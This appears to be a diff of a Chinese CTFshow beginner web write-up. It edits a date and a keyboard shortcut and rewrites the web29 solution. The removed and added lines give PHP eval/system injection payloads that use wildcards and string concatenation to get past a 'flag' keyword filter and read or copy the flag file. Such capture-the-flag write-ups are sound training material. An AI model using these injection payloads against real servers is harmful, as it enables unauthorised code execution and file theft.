@@ -1,6 +1,6 @@
 ---
 title: "CTFshow-web入门"
-date: 2026-11-04
+date: 2026-11-05
 draft: false
 categories: ["web"]
 ---
@@ -13,7 +13,7 @@ categories: ["web"]
 
 ### web2
 
-右键打不开，使用快捷键`Command + Option + U`
+右键打不开，使用快捷键`ctrl+ U`
 
 ### web3
 
@@ -257,32 +257,23 @@ Burp Suite 的 **Attack Type** 选择是解题效率的关键：
 
 ### web29
 
-#### 代码逻辑分析
+这题过滤了flag，不能直接打flag
 
-1. **`error_reporting(0);`**: 关闭错误报告，防止报错信息泄露。
-2. **`if(isset($_GET['c']))`**: 检查是否通过 GET 请求传递了参数 `c`。
-3. **`if(!preg_match("/flag/i", $c))`**: 核心防御逻辑。使用正则表达式检查变量 `$c` 中是否包含 "flag" 字符串（`i` 表示不区分大小写）。如果不包含，则执行下一步。
-4. **`eval($c);`**: 这是一个极其危险的函数，它会将字符串 `$c` 当作 PHP 代码直接执行。
-5. **`highlight_file(__FILE__);`**: 如果没有参数 `c`，则显示当前源代码。
+1.直接*代替其中的字符
 
-#### 绕过思路
+```
+?c=system("cat fl*g.php");
+```
 
-由于后端过滤了 `flag` 这个词，我们无法直接使用类似 `system("cat flag.php");` 的命令。我们需要通过一些技巧来绕过正则检测。
+注：因为浏览器默认不显示php的标签所以需要右键查看源代码，或者直接用grep匹配出flag
 
-##### 1. 使用通配符 (Wildcards)
+2.
 
-在 Linux Shell 中，`?` 匹配单个字符，`*` 匹配任意字符。
+```
+?c=system("cp fl*g.php a.txt ");
+```
 
-- **Payload:** `?c=system("cat f*");`
-- **Payload:** `?c=system("cat fla?.php");`
-
-##### 2. 使用 PHP 变量拼接
-
-我们可以将字符串拆开，避开正则检测。
-
-- **Payload:** `?c=$a="fla";$b="g.php";system("cat ".$a.$b);`
-
-这两种都可以，但要查看源代码才能得到flag
+访问/a.txt
 
 ### web30
 
